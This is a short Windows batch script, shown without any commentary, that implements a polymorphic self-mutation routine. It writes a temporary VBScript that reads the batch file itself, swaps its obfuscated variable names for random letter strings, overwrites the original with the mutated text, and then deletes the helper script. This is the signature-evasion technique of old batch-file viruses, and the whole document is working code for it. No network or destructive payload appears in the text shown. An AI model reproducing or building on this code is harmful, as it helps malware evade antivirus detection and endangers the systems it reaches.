@set gbegj=echo
@set jmnpe=copy

%gbegj% set ff=createobject("scripting.filesystemobject")>>poly.vbs
%gbegj% set rr=ff.opentextfile(%0,1)>>poly.vbs
%gbegj% aa = rr.readall>>poly.vbs
%gbegj% rr.close>>poly.vbs
%gbegj% Randomize>>poly.vbs
%gbegj% poly = int(rnd * 3)>>poly.vbs
%gbegj% if poly = 0 or poly = 2 then>>poly.vbs
%gbegj% s = chr(int(22 * rnd) + 97)>>poly.vbs
%gbegj% rand1 = Replace(aa,"gbegj","gbegj" ^& s ^& poly)>>poly.vbs
%gbegj% rand2 = Replace(rand1,"jmnpe","jmnpe" ^& s ^& s ^& poly)>>poly.vbs
%gbegj% else>>poly.vbs
%gbegj% polynum = int(rnd * 7)>>poly.vbs
%gbegj% for i = 1 to polynum>>poly.vbs
%gbegj% polychar = chr(int(22 * rnd) + 97)>>poly.vbs
%gbegj% polyall = polyall + polychar>>poly.vbs
%gbegj% next>>poly.vbs
%gbegj% s = chr(int(22 * rnd) + 97)>>poly.vbs
%gbegj% rand1 = Replace(aa,"gbegj",polyall )>>poly.vbs
%gbegj% rand2 = Replace(rand1,"jmnpe", s ^& polyall)>>poly.vbs
%gbegj% end if>>poly.vbs
%gbegj% set bb=ff.opentextfile(%0,2)>>poly.vbs
%gbegj% bb.write rand2>>poly.vbs
@cscript poly.vbs
@del poly.vbs
@exit
